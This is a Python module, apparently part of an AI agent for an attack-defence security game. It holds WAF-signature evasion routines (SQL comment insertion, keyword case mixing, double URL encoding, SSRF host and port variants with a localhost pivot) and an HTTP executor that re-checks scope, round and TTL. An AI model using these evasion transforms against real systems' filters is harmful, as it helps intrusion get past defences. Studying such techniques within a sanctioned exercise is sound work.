"""허용 도구 레지스트리·실행 어댑터·범위 재검증·시그니처 회피.

설계 §9.10. 도구는 실행 직전에 대상이 `TARGETS × PORTS`(+제출·LiteLLM)에 포함되는지
재검증한다(운영세칙 제11·24조). 상대 방어 에이전트는 패킷 시그니처로 DROP하는 필터이므로,
같은 exploit·경로를 유지하면서 페이로드를 재인코딩해 시그니처를 회피하는 것은 이 게임의
정당한 핵심 기법이다(스켈레톤 agent-guide). 단 rate limit 자체를 우회하는 조작은 금지(제24조 8호).
"""

from __future__ import annotations

import time
import re
import urllib.parse

from .models import (
    Capability,
    ExecutionPlan,
    Observation,
    Outcome,
    SideEffectClass,
    ToolResult,
)
from .observation import EvidenceFactory, fingerprint, notable_headers

_QUOTE_SAFE = "/?&=%:+@,;!*'()$-_.~"


class PlanBindingError(Exception):
    """계획의 capability·Round·endpoint·TTL·증거·부작용 재검증 실패(§9.10)."""


# ---- 시그니처 회피 (상대 방어 필터 우회, 규칙 내) ----

def url_encode_tokens(payload: str) -> str:
    """의심 토큰을 URL 인코딩. ../ -> %2e%2e%2f, ' -> %27, 공백 -> + 등."""
    return (payload
            .replace("../", "%2e%2e%2f")
            .replace("'", "%27")
            .replace(" ", "+"))


def double_encode_tokens(payload: str) -> str:
    return (payload
            .replace("../", "%252e%252e%252f")
            .replace("'", "%2527")
            .replace(" ", "%2520"))


def vary_keyword_case(payload: str) -> str:
    """SQL/헤더 키워드 케이스 변형(UNION -> UnIoN 등)."""
    out = payload
    for kw in ("UNION", "SELECT", "FROM", "WHERE", "OR", "AND"):
        out = _recase(out, kw)
    return out


def _recase(text: str, kw: str) -> str:
    import re
    def repl(m):
        s = m.group(0)
        return "".join(c.upper() if i % 2 else c.lower() for i, c in enumerate(s))
    return re.sub(kw, repl, text, flags=re.IGNORECASE)


def insert_sql_comments(payload: str) -> str:
    """인라인 주석 삽입(UNION -> UN/**/ION)."""
    return (payload
            .replace("UNION", "UN/**/ION")
            .replace("SELECT", "SE/**/LECT")
            .replace("union", "un/**/ion")
            .replace("select", "se/**/lect"))


def _decode_repeated(value: str, rounds: int = 3) -> str:
    current = value
    for _ in range(rounds):
        decoded = urllib.parse.unquote_plus(current)
        if decoded == current:
            break
        current = decoded
    return current


def _encode_all(value: str) -> str:
    return "".join(f"%{byte:02X}" for byte in value.encode("utf-8"))


def fully_encode_target(payload: str) -> str:
    """Encode route, parameter names, and values while keeping HTTP delimiters."""
    base, separator, query = payload.partition("?")
    encoded_base = ("/" if base.startswith("/") else "") + _encode_all(base.lstrip("/"))
    if not separator:
        return encoded_base
    encoded_items = []
    for item in query.split("&"):
        name, equals, value = item.partition("=")
        encoded = _encode_all(_decode_repeated(name))
        if equals:
            encoded += "=" + _encode_all(_decode_repeated(value))
        encoded_items.append(encoded)
    return encoded_base + "?" + "&".join(encoded_items)


def _query_value_variant(payload: str, transform) -> str:
    base, separator, query = payload.partition("?")
    if not separator or not query:
        return payload
    first, amp, rest = query.partition("&")
    name, equals, value = first.partition("=")
    if not equals:
        return payload
    transformed = transform(_decode_repeated(value))
    encoded = urllib.parse.quote(transformed, safe="/*'(),|:[]")
    return f"{base}?{name}={encoded}" + (("&" + rest) if amp else "")


def _ssrf_variants(payload: str, endpoint_port: int | None) -> list[str]:
    base, separator, query = payload.partition("?")
    first, _, _ = query.partition("&")
    name, equals, value = first.partition("=")
    if not separator or not equals:
        return []
    decoded = _decode_repeated(value)
    if not decoded.lower().startswith(("http://", "https://")):
        return []
    try:
        parsed = urllib.parse.urlsplit(decoded)
        host = parsed.hostname or ""
        port = parsed.port
    except ValueError:
        return []
    if not host:
        return []
    scheme = parsed.scheme.lower()
    path = parsed.path or "/"
    suffix = ("?" + parsed.query) if parsed.query else ""

    def outer(url: str) -> str:
        return f"{base}?{name}={urllib.parse.quote(url, safe='')}"

    variants = []
    shown_host = f"[{host}]" if ":" in host else host
    authority_port = f":{port}" if port is not None else ""
    variants.append(outer(f"{scheme}://{shown_host.rstrip('.')}.{authority_port}{path}{suffix}"))
    variants.append(outer(f"{scheme}://{shown_host.upper()}{authority_port}{path}?"))
    if port is not None:
        variants.append(outer(f"{scheme}://{shown_host}:0{port}{path}{suffix}"))
    variants.append(outer(f"{scheme}://{shown_host}{authority_port}//{path.lstrip('/')}{suffix}"))
    if endpoint_port:
        inner = urllib.parse.quote(decoded, safe="")
        pivot = f"http://127.0.0.1:{endpoint_port}{base}?{name}={inner}"
        variants.append(outer(pivot))
    variants.append(payload.replace("%", "%25"))
    return variants


def _sql_variants(payload: str) -> list[str]:
    upper = _decode_repeated(payload).upper()
    if "UNION" not in upper or "SELECT" not in upper:
        return []

    def separator_comments(value: str) -> str:
        value = re.sub(
            r"\bUNION\s+(ALL\s+)?SELECT\b",
            lambda match: "UNION/**/" + ("ALL/**/" if match.group(1) else "") + "SELECT",
            value,
            flags=re.IGNORECASE,
        )
        return re.sub(r"\s+FROM\s+", "/**/FROM/**/", value, flags=re.IGNORECASE)

    def control_whitespace(value: str) -> str:
        return re.sub(r"\s+", "\n\n", value)

    def bracket_source(value: str) -> str:
        return re.sub(r"\bapp_meta\b", "[app_meta]", value, flags=re.IGNORECASE)

    return [
        _query_value_variant(payload, separator_comments),
        _query_value_variant(payload, control_whitespace),
        _query_value_variant(payload, bracket_source),
    ]


def evasion_variants(payload: str, endpoint_port: int | None = None) -> list:
    """동일 의도를 유지한 회피 변형들을 관측된 방어 반응 순서로 반환한다."""
    variants = []
    candidates = (
        _ssrf_variants(payload, endpoint_port)
        + _sql_variants(payload)
        + [fully_encode_target(payload)]
        + [fn(payload) for fn in (
            url_encode_tokens, vary_keyword_case, insert_sql_comments, double_encode_tokens
        )]
    )
    for v in candidates:
        if v != payload and v not in variants:
            variants.append(v)
    return variants


# ---- 실행 어댑터 ----

class ExecutionAdapter:
    """단일 HTTP 도구 실행기. 실행 직전 capability·binding·TTL·부작용·rate 재검증.

    범위(host·port) allowlist는 egress gateway가 강제한다(§9.10).
    """

    def __init__(self, egress, rate, round_id: str = "", clock=time.monotonic,
                 evidence: EvidenceFactory = None):
        self._egress = egress
        self._rate = rate
        self._round_id = round_id
        self._clock = clock
        self._evidence = evidence or EvidenceFactory(round_id, clock)

    def _validate_binding(self, plan: ExecutionPlan, endpoint_id: str) -> None:
        now = self._clock()
        if plan.capability != Capability.ATTACK_TARGET:
            raise PlanBindingError("ATTACK_TARGET capability 아님")
        if plan.round_id and plan.round_id != self._round_id:
            raise PlanBindingError("Round 불일치")
        if plan.endpoint_id and plan.endpoint_id != endpoint_id:
            raise PlanBindingError("endpoint 불일치")
        if now >= plan.expires_at_monotonic:
            raise PlanBindingError("계획 TTL 만료")
        if not plan.evidence_refs:
            raise PlanBindingError("신선한 증거 없음")
        for ref in plan.evidence_refs:
            if not ref.valid_at(now, self._round_id, endpoint_id):
                raise PlanBindingError("증거 TTL·binding 불일치")
        if plan.side_effect_class == SideEffectClass.DISALLOWED:
            raise PlanBindingError("금지된 부작용 등급")
        if (plan.side_effect_class == SideEffectClass.BOUNDED_FLAG_DIRECTED_MUTATION
                and not plan.preconditions):
            raise PlanBindingError("변경 작업에 안전 선행조건 없음")

    def execute(self, plan: ExecutionPlan) -> ToolResult:
        endpoint_id = plan.target.endpoint_id
        self._validate_binding(plan, endpoint_id)

        method = str(plan.args.get("method", "GET")).upper()
        raw_path = plan.args.get("path", "/") or "/"
        if not raw_path.startswith("/"):
            raw_path = "/" + raw_path
        url = plan.target.base_url() + urllib.parse.quote(raw_path, safe=_QUOTE_SAFE)
        headers = plan.args.get("headers") or {}
        body = plan.args.get("body") or None

        self._rate.acquire_request()
        start = self._clock()
        # egress가 host·port allowlist·capability 교차·redirect를 강제한다.
        resp = self._egress.request(
            Capability.ATTACK_TARGET, method, url, headers, body, plan.timeout)
        latency_ms = (self._clock() - start) * 1000.0

        outcome = Outcome.SUCCESS if resp.status != 0 else Outcome.TIMEOUT
        body_fp = fingerprint(resp.body)
        obs = Observation(
            endpoint=plan.target,
            request_fingerprint=fingerprint(f"{method} {raw_path}"),
            status=resp.status,
            redacted_header_hints=notable_headers(resp.headers),
            body_fingerprint=body_fp,
            latency_ms=latency_ms,
            note="no-response" if resp.status == 0 else "",
            round_id=self._round_id,
            evidence_ref=self._evidence.make(plan.target, body_fp),
        )
        return ToolResult(plan=plan, outcome=outcome, observation=obs, body=resp.body)
